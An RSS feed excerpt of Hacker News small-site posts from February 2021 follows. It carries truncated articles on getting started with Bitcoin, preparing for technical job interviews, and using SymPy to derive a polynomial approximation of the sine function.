<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the ‚Äúoriginal‚Äù cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ‚Äï but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of ‚Äúdigital money‚Äù that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ‚Äï with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network‚Äôs miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ‚Äï this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ‚Äï think of them as ‚Äúprotectors‚Äù who are constantly monitoring Bitcoin‚Äôs blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin‚Äôs value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ‚Äï to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin‚Äôs technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let‚Äôs dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ‚Äï the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ‚Äï so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop‚Äôs window that says ‚ÄúBitcoin accepted here.‚Äù As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122394</guid>
            <pubDate>Sat, 13 Feb 2021 09:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Wall St. Warriors ‚Äì a bit clunky but it works]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122390">thread link</a>) | @chovybizzass
<br/>
February 13, 2021 | https://www.wallstwarriors.com/home | <a href="https://web.archive.org/web/*/https://www.wallstwarriors.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.wallstwarriors.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122390</guid>
            <pubDate>Sat, 13 Feb 2021 09:01:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Acing your technical interview ‚Äì a hiring manager‚Äôs guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122313">thread link</a>) | @ochronus
<br/>
February 13, 2021 | https://ochronus.online/acing-the-tech-interview/ | <a href="https://web.archive.org/web/*/https://ochronus.online/acing-the-tech-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-url="https://ochronus.online/acing-the-tech-interview/" data-title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide">
<p>Even though interviewing for a software engineering job can be intimidating and frustrating (with whiteboard exercises, remote coding challenges, and even full days of onsite interviews), it‚Äôs a lot easier when you know what to expect and are well-prepared.</p>
<p>I‚Äôve interviewed a few hundred software engineering candidates in the past 10+ years and designed hiring processes. My experience is limited to startups and mid-sized companies, so take everything you read here with that in mind. My advice may not get you into <a href="https://www.facebook.com/careers/facebook-life/how-we-hire" target="_blank" rel="noopener">Facebook</a> or <a href="https://careers.google.com/how-we-hire/" target="_blank" rel="noopener">Google</a> but will definitely increase your chances at mid-sized companies with a good culture!</p>
<p>In the first part of this article, I‚Äôll give some context, then give you an actionable list to improve your experience and chances in your next interview</p>
<p>If you‚Äôre only interested in the actionable list, feel free to skip ahead to it.</p>

<h2 id="what-you-think-about-the-technical-interview-might-be-incomplete"><span id="What_you_think_about_the_technical_interview_might_be_incomplete">What you think about the technical interview might be incomplete</span></h2>
<p>First and foremost, a technical interview is almost never only technical. Up to a certain (and honestly, very useful!) level growing as a ‚Äòcoder‚Äô is not that complicated. Many candidates perform pretty well if we purely look at their coding skills.</p>
<p>The thing is, you‚Äôll rarely work alone in isolation on your own codebase. You‚Äôll have teammates, you‚Äôll need to agree on things with them, you‚Äôll build on others‚Äô code and others will build on your code. You‚Äôll need to build solutions with a certain level of quality, in a future-proof way, for extensibility, and with performance in mind. Depending on your role and level, you‚Äôll need to architect systems. You‚Äôll need to mentor other engineers. You‚Äôll need to onboard new team members. You‚Äôll need to proactively reach out to other teams in the company and understand their points of view and problems. You‚Äôll talk to product managers, UX researchers, designers, even customers sometimes. You‚Äôll need to manage projects, make tradeoffs and decisions, and align other engineers with that.</p>
<p>Read my article about&nbsp;<a href="https://ochronus.online/technical-interview-myths/">the most common 11 technical interview myths</a> ‚Äì you‚Äôll get a better view of how people think on the other side of the table.</p>
<h2 id="types-and-stages-of-technical-interviews"><span id="Types_and_stages_of_technical_interviews">Types and stages of technical interviews</span></h2>
<p>Most companies use a combination of these steps:</p>
<ul><li>Screening call with a recruiter ‚Äì We‚Äôre interested in your basic motivations; we‚Äôd like to have a gut feeling about what you‚Äôre looking for and do some sanity check here. You might get asked about your salary requirements, support you need for visa or relocation, timelines (when could you start, etc.). Some recruiters will also ask you whether you have applied elsewhere, so they know how urgent this is for them and you.</li><li>Screening call with the hiring manager ‚Äì Expect some deeper dive into your experience on multiple fronts ‚Äì tech and ‚Äòsoft skills‚Äô alike. As a hiring manager, I‚Äôll prepare by checking out your CV for talking points, maybe even your LinkedIn profile, and definitely GitHub. I‚Äôm not trying to judge you; I‚Äôm just looking for points of connection. I‚Äôll answer any questions you have about the role, the company, the culture, potential teams you‚Äôd be joining, etc. My ultimate goal with this is twofold: would we be a good match for your (and vice versa) and whether I think you‚Äôd be successful in the role.</li><li>Remote technical screening ‚Äì An alternative, or at some places precursor to the online coding exercise. This is with a human on the other end of the line ‚Äì solving tech problems together; usually, you walk them through your solution.</li><li>Online coding exercises (LeetCode, HackerRank, etc.) ‚Äì I know you all hate this. We need such a step to filter out people who can‚Äôt even code at all early on. You‚Äôd be surprised about the number of such applicants. I avoid algorithm/data structure exercises here and try to come up with somewhat interesting ones. Some companies use a much heavier set of exercises and judge your technical skills solely on this. While I disagree with that strategy, you need to get prepared for this, too.</li><li>Take-home assignment ‚Äì this is one of the most polarizing interview steps for engineers. Some hate it, claiming it‚Äôs just free labor for the companies, and it takes too much time. Others love it because they feel they have the freedom to give it much time, really showing off their skills in their own comfortable environment. <a href="https://levelup.gitconnected.com/take-home-assignment-mistakes-which-will-guarantee-someone-else-gets-the-job-36bcee1cec1d" target="_blank" rel="noopener">Whichever camp you‚Äôre in</a>, you can expect some companies requiring this. You usually get a somewhat specified problem to solve, and you‚Äôre given different levels of freedom on how to solve it ‚Äì some companies don‚Äôt mind you choosing whichever stack you like; others will even specify the framework.</li><li>Onsite workshop / remote workshop ‚Äì I think this is the most interesting of all steps (well, for me, at least). It‚Äôs about solving problems together with people from the company in a simulated environment. You‚Äôll need to show your communication, decision-making, and even prioritization skills here. Sure, people will look at your code‚Äôs quality, too, but ‚Äòsoft skills‚Äô are just as important here. We‚Äôll get strong signals about how it would be to have you on the team.</li></ul>
<h2 id="cracking-the-technical-interview"><span id="Cracking_the_technical_interview">Cracking the technical interview</span></h2>
<h3 id="ask-the-recruiter-or-the-hiring-manager-before-the-interview"><span id="Ask_the_recruiter_or_the_hiring_manager_before_the_interview">Ask the recruiter or the hiring manager before the interview</span></h3>
<figure><picture title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide 3">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg.webp 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 306px) 100vw, 306px">
<img width="306" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" alt="ask the recruiter or hiring manager 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg 300w" data-lazy-sizes="(max-width: 306px) 100vw, 306px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg">
</picture>
</figure>
<p>Take the guesswork out of the equation. If you feel you don‚Äôt have enough information to prepare for your technical interview, just ask for more! We‚Äôre here to help you succeed. I really mean it. Sometimes we aren‚Äôt doing a great job with sharing enough information proactively about the interview steps but that‚Äôs not intentional! I‚Äôm always happy to help you prepare better ‚Äì ask about anything, please. You‚Äôre doing both of us a favor with that. Simply ask during the previous technical interview step or just drop me or the recruiter an email at any time.</p>
<h3 id="show-up-on-time"><span id="Show_up_on_time">Show up on time</span></h3>
<figure><picture title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg.webp 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 399px) 100vw, 399px">
<img width="399" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" alt="arrive on time 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg 300w" data-lazy-sizes="(max-width: 399px) 100vw, 399px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg">
</picture>
</figure>
<p>Make sure you arrive at your technical interview on time. If you can‚Äôt, for some reason, please let us know, we‚Äôll happily reorganize for another time, no hard feelings (sh*t happens). Showing up on time isn‚Äôt only about respecting each other‚Äôs schedule ‚Äì interview time slots are usually 100% utilized and by arriving 10 minutes late you‚Äôre reducing your own chance to be successful. You‚Äôre also making it more stressful for yourself than necessary. If you need time for commute or for your Zoom/Google Meet setup, think ahead and give yourself a buffer before the start. You‚Äôll also love the extra 10 minutes before the interview to tune in and get calmer.</p>
<h3 id="don-t-jump-right-into-solution-mode-read-distill-paraphrase"><span id="Dont_jump_right_into_solution_mode_-_read_distill_paraphrase">Don‚Äôt jump right into solution mode ‚Äì read, distill, paraphrase</span></h3>
<figure><picture title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide 5">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg.webp 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 328px) 100vw, 328px">
<img width="328" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" alt="read distill paraphrase 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg 300w" data-lazy-sizes="(max-width: 328px) 100vw, 328px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg">
</picture>
</figure>
<p>The biggest mistake you can do is thinking you understand the problem or what‚Äôs asked of you and jumping right into coding in the technical interview. Take your time, carefully read the problem statement, distill it, don‚Äôt think of solutions just yet. When you feel you understand what‚Äôs asked of you or when you thought about clarifying questions to ask, communicate. <a href="https://www.mindtools.com/pages/article/paraphrasing-summarizing.htm" target="_blank" rel="noopener">Paraphrase</a> what you understood from the problem statement so you can verify it with your interviewers. Only when you‚Äôre on the same page can you shift into solution mode. Even if you come up with the best solution ultimately if you skip this step I‚Äôll remember and have doubts about how it‚Äôd be to work with you. Thinking aloud is really useful here ‚Äì it will help you and help me too to understand what‚Äôs on your mind.</p>

<h3 id="be-articulate-and-communicate-clearly"><span id="Be_articulate_and_communicate_clearly">Be articulate and communicate clearly</span></h3>
<figure><picture title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide 6">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg.webp 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 401px) 100vw, 401px">
<img width="401" height="255" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" alt="communicate clearly" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg 300w" data-lazy-sizes="(max-width: 401px) 100vw, 401px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg">
</picture>
</figure>
<p>Even if you know your trade and you‚Äôre the best engineer in the world, if you fail to communicate clearly during the technical interview we‚Äôll have no way of knowing. This takes practice for most people, so take your time and prepare! Use standard terms that other engineers can relate to, avoid passive voice, and be able to articulate what‚Äôs going on in your mind while you‚Äôre thinking. If you need some time to think quietly, say so, don‚Äôt just fall silent suddenly. We‚Äôre trying our best to communicate our expectations around this but it might be a bit late when you‚Äôre in the interview. Trust me on this one, practice here goes a long way.</p>
<h3 id="ask-clarifying-questions"><span id="Ask_clarifying_questions">Ask clarifying questions</span></h3>
<figure><picture title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide 7">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E">
<img width="269" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E" alt="ask clarifying questions 1" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg">
</picture>
</figure>
<p>While you‚Äôd think the technical interview is about you answering questions, expect that you will need to ask a lot of them, too! When you are in the interview and something is not clear don‚Äôt default to thinking ‚ÄúOh god, I should know this, I should understand‚Äù ‚Äì sometimes we are interested in how you behave in such situations, and sometimes we‚Äôre just simply not good enough in giving enough context. If you‚Äôre stuck, a good technique is to ask for clarification! It‚Äôs also 100% OK to say things like ‚ÄúI didn‚Äôt quite get that. Could you rephrase please?‚Äù or ‚ÄúI‚Äôm not sure I understand what you‚Äôre asking‚Äù. These are good signals! I expect my team members to behave like this. These are not signals of you failing. I know it feels like that, but trust me, it‚Äôs just your brain playing tricks on you. I highlight this during the interview several times, to make sure the candidate feels safe asking such questions. Another technique I wholeheartedly welcome is paraphrasing ‚Äì e.g. ‚ÄúWhat I understood from what you said is that I should implement this using co-monads‚Äù (said nobody ever).</p>
<h3 id="demonstrate-your-tech-skills-the-right-way"><span id="Demonstrate_your_tech_skills_the_right_way">Demonstrate your tech skills the right way</span></h3>
<figure><picture title="Acing your technical interview ‚Äì a hiring manager‚Äôs guide 8">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E">
<img width="293" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E" alt="t shaped engineer" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg">
</picture>
</figure>
<p>Make us see that you‚Äôre deeply proficient in at least one technology. This can be a programming language, for example. Also, demonstrate that you know the adjacent technologies ‚Äì most companies are looking for so-called <a href="https://www.forbes.com/sites/davidmichels/2019/09/27/going-pi-shaped-how-to-prepare-for-the-work-of-the-future/" target="_blank" rel="noopener">T-shape</a> engineers. This means that mentioning other aspects of the problem and the solution goes a long way. For example, if you‚Äôre asked to implement a service in NodeJS, mention how you‚Äôd deploy, monitor, and scale it, even if that‚Äôs not explicitly asked. No need to go into too many details (unless people ask you). If you‚Äôre only focused on a single piece of the puzzle I‚Äôll have a hard time seeing how you‚Äôd perform well in a changing environment (where you‚Äôll need to make connections and work on multiple zoom levels and be ready). This is a very generic statement and might not be true in the case of highly specialized roles, of course. On the other hand, if ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/acing-the-tech-interview/">https://ochronus.online/acing-the-tech-interview/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/acing-the-tech-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122313</guid>
            <pubDate>Sat, 13 Feb 2021 08:44:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SymPy makes math fun again]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122199">thread link</a>) | @okaleniuk
<br/>
February 13, 2021 | https://wordsandbuttons.online/sympy_makes_math_fun_again.html | <a href="https://web.archive.org/web/*/https://wordsandbuttons.online/sympy_makes_math_fun_again.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	<p>
I remember my own struggle with calculus at university. Limits, integrals, differential equations. Lots of practice, lots of homework. Pages and pages of exercises. I loved math, the connection between algebra and geometry, the very pleasure of solving problems by making different concepts work together. But I hated doing the ‚Äúpaperwork‚Äù.
	</p>
	<p>
Taking it seriously, I still studied through the semester, studied harder the week before the exam, studied even harder the night before. I got 62/100. That's 1 point above the lowest possible passing grade.
	</p>
	<p>
Well, maybe math is not for everyone. But wait a minute! The next semester I took part in the Math Olympiad, went through the faculty round, then through the university round, went to the nationals, and even managed to score a few points there. Which counted as a pass on that semester's exam.
	</p>
	<p>
Professors were proud of me. And for almost a year, they thought that the first semester's score was a mistake. Until in the third semester, I scored 65/100.
	</p>
	
	<p>
Mathematics is a lot of things. It's the fun of problem-solving, it's the excitement of discoveries, it's the pride of accomplishments, and it's a ton of tedious computations, too. I never liked that last part. I still don't. That's why I'm so happy to live in the XXI century since I can give it away to computers and still enjoy the first three.
	</p>
	<h2>
<span id="index_sympy">SymPy</span> it is
	</h2>
	<p>
According to the <a href="https://www.sympy.org/en/index.html">official site</a>:
	</p>
	<p><i>
SymPy is a Python library for <span id="index_symbolic_mathematics">symbolic mathematics</span>. It aims to become a full-featured computer algebra system (CAS) while keeping the code as simple as possible in order to be comprehensible and easily extensible.
	</i></p>
	<p>
Symbolic mathematics? Algebra system? Sounds exclusive. Sounds like it's a tool for practicing mathematicians and the students who desperately want to become one. But it isn't. It's for practicing engineers who have just enough math knowledge to state a problem but not enough patience to solve it.
	</p>
	<p>
It does integration and differentiation. It finds limits, and it expands series. It solves equations and systems of equations. It can even do statistics. And it does it all just like you would do on an exam. It doesn't just compute numbers, it computes formulas.
	</p>
	<p>
It's a Python library that does the boring part of math for you. Moreover, it does it fast, accurately, and without angst. In other words, it is everything I'm not.
	</p>
	<h2>
Let SymPy do some math for you
	</h2>
	<p>
Let's say we want to model the sine function with a polynomial. Let's pretend we have a reason. Now how do we do that?
	</p>
	<p>
How about, we gather all we know about the sine function in one bowl and let SymPy do the rest? Sounds good?
	</p>
	<canvas id="sine" width="640" height="480"></canvas>
	
	<p>
We know that <i>sin(0) = 0</i>, right? Everybody knows that. Also, as you might have heard, you can approximate a small sine with its own argument: <i>sin(0.001) ‚âÉ 0.001</i>. This means that the derivative of sine in 0 is 1.
	</p>
	<p>
The sine function climbs from 0 to œÄ/2 and then it starts going down. In œÄ/2 it's neither climbing nor descending, it's at its peak. This means that the derivative of <i>sin(œÄ/2)' = 0</i>. Also, since the sine only climbs to 1, <i>sin(œÄ/2) = 1</i>.
	</p>
	<p>
The sine is symmetrical relative to œÄ/2. This means that it descends exactly as it climbs, and at the point where it reaches full œÄ, its derivative is <i>sin(œÄ)' = -1</i>, and the function itself <i>sin(œÄ) = 0</i>.
	</p>
	<p>
Also, one less known (but easily computable) fact, the integral of the sine from 0 to œÄ/2 is 1. Let's throw this into the bowl as well.
	</p>
	<p>
So, we have 7 facts. This implies 7 equations. This implies that our polynomial will have 7 coefficients and the highest degree will be then 6.
	</p>
	<p>
Let's translate it all into Python.
	</p>
	<div>
	<pre id="code_1">from sympy import *

a, b, c, d, e, f, g, x = symbols('a b c d e f g x')

sine = a*x**6 + b*x**5 + c*x**4 + d*x**3 + e*x**2 + f*x + g
sine_d = diff(sine, x)
sine_i = integrate(sine, x)

the_system = [
    sine_i.subs(x, pi / 2) - sine_i.subs(x, 0) - 1,
    sine_d.subs(x, 0) - 1,
    sine_d.subs(x, pi / 2),
    sine_d.subs(x, pi) + 1,
    sine.subs(x, 0),
    sine.subs(x, pi / 2) - 1,
    sine.subs(x, pi)
]

res = solve(the_system, (a, b, c, d, e, f, g))

for var, exp in res.items():
    print(var, srepr(exp))
</pre>
	</div>
	<p>
You can browse <a href="https://docs.sympy.org/latest/tutorial/index.html">the tutorial</a> if you like but it should be more or less clear as it is. <i>sine</i> is our polynomial model. <i>diff</i> is differentiation. <i>integrate</i> is integration. <i>solve</i> is solve. Simple! The only cryptic thing here is <i>srepr</i>. It turns the solution into a special form of expression that looks like this:
	</p>
	<p>
&nbsp;&nbsp;(f, 'Integer(1)') <br>
&nbsp;&nbsp;(c, 'Mul(Integer(5), Pow(pi, Integer(-5)), Add(Mul(Integer(-1), Integer(288), pi), Mul(Integer(-1), Integer(19), Pow(pi, Integer(2))), Integer(1092)))') <br>
